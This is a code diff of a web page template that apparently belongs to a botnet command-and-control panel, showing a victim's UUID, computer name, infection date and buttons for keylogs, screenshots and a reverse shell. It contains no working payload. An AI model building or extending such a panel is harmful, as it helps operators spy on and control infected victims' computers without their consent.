@@ -1,8 +1,55 @@
 <%- include('../partials/header'); %>
     <%- include('../partials/navbar'); %>
 
-    <div class="jumbotron">
-        <h1 class="text-center">Victime simple : <%= single_client.computerName %></h1>
+    <div class="container-fluid">
+        <h3 class="text-center">UUID : <%= single_client.uuid %></h3>
+
+        <%
+            const yearUpdate = single_client.updatedAt.getFullYear()
+            const monthUpdate = (single_client.updatedAt.getMonth() < 9 ? '0' : '') + (single_client.updatedAt.getMonth() + 1)
+            const dayUpdate = single_client.updatedAt.getDate()
+            const hoursUpdate = (single_client.updatedAt.getHours() < 9 ? '0' : '') + (single_client.updatedAt.getHours())
+            const minutesUpdate = (single_client.updatedAt.getMinutes() < 9 ? '0' : '') + (single_client.updatedAt.getMinutes()) 
+            const clientUpdateDate = yearUpdate + '-' + monthUpdate + '-' + dayUpdate + ' ' + hoursUpdate + ':' + minutesUpdate
+
+            const yearInfection = single_client.createdAt.getFullYear()
+            const monthInfection = (single_client.createdAt.getMonth() < 9 ? '0' : '') + (single_client.createdAt.getMonth() + 1)
+            const dayInfection = single_client.createdAt.getDate()
+            const hoursInfection = (single_client.createdAt.getHours() < 9 ? '0' : '') + (single_client.createdAt.getHours())
+            const minutesInfection = (single_client.createdAt.getMinutes() < 9 ? '0' : '') + (single_client.createdAt.getMinutes()) 
+            const clientInfectionDate = yearInfection + '-' + monthInfection + '-' + dayInfection + ' ' + hoursInfection + ':' + minutesInfection
+        %>
+
+        <div class="card">
+            <div class="card-body">
+                <div class="row justify-content-center align-items-center">
+                    <div class="col-4">
+                        <img class="" src="/static/img/botnet_logo.png" alt="Flag Country">
+                    </div>
+                    <div class="col-4">
+                        <div>
+                            Computer Name : <%= single_client.computerName %>
+                        </div>
+                        <div>
+                            IP Address : 127.0.0.1 (France)
+                        </div>
+                        <div>
+                            Date Infection : <%= clientInfectionDate %>
+                        </div>
+                        <div>
+                            Last Update : <%= clientUpdateDate %>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="d-grid gap-2 d-md-flex justify-content-around mt-4">
+            <button class="btn btn-secondary btn-command" type="button">Keylogs</button>
+            <button class="btn btn-secondary btn-command" type="button">Screenshots</button>
+            <button class="btn btn-secondary btn-command" type="button">Reverse Shell</button>
+        </div>
+
     </div>
 
 <%- include('../partials/footer'); %>
